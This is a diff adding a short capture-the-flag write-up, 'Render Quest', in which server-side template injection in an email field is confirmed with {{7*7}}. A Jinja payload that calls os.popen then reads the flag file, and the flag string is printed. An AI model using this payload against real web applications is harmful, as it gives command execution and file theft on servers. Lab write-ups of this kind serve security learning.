@@ -93,6 +93,35 @@
 
 -----------------
 
+### Render Quest
+
+-----------------
+
+![image](https://github.com/user-attachments/assets/3df75bf5-3b10-4388-956d-c32680586704)
+
+-----------------
+
+- The `email` is vulnerable to server side template injection. I tried payload `{{7*7}}` and got `49`.
+
+![image](https://github.com/user-attachments/assets/ce338c1b-bb08-4ffe-892a-9933ddef272d)
+
+- RCE gained,The value below is the result of command `ls`.
+
+![image](https://github.com/user-attachments/assets/1b6d5e42-5111-4445-806c-3d5fac4a8c34)
+
+- Flag-:```htbmeetupcmr{Sup3r_S3rv3r_T3mpl4t3_1nj3ct}```
+
+Final payload-: `{{config.__init__.__globals__.os.popen('cat .flag.txt').read()}}`
+
+![image](https://github.com/user-attachments/assets/b8c1f7af-8653-4b7f-9a0e-dd41d81f212f)
+
+-----------------
+
+### THANKS FOR READING
+
+-----------------
+
+
 
 
 
